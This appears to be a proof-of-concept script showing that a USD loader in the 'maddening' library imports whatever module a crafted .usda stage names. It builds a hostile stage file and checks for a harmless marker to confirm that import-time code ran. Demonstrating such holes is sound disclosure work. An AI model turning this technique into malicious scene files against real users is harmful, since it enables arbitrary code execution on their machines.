"""load_graph_from_usd() imports any module path a (hostile) stage names.

GraphManager.from_dict requires an explicit node_registry; the USD reader
falls back to importlib.import_module on the stage's `maddening:nodeType`
string, so opening an untrusted .usda runs that module's import-time code.
"""
import os, sys, tempfile, pathlib
from pxr import Usd
marker = pathlib.Path(tempfile.gettempdir()) / "maddening_usd_import_marker.txt"
marker.unlink(missing_ok=True)
os.environ["PWNED_MARKER"] = str(marker)
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)) + "/../evilmod")

usda = """#usda 1.0
def MaddeningSimulationGraph "Simulation" {
    def Scope "nodes" {
        def MaddeningNode "n" {
            custom string maddening:nodeType = "hostile_payload.Anything"
            custom string maddening:nodeName = "n"
            custom double maddening:timestep = 0.01
            custom string maddening:paramsJson = "{}"
        }
    }
}
"""
path = pathlib.Path(tempfile.mkdtemp()) / "hostile.usda"
path.write_text(usda)
from maddening.usd.serialization import load_graph_from_usd
stage = Usd.Stage.Open(str(path))
print("marker before:", marker.exists())
try:
    load_graph_from_usd(stage)
except Exception as e:
    print("load raised:", type(e).__name__, str(e)[:100])
print("marker after :", marker.exists(),
      "->", marker.read_text().strip() if marker.exists() else "")
print("'hostile_payload' in sys.modules:", "hostile_payload" in sys.modules)
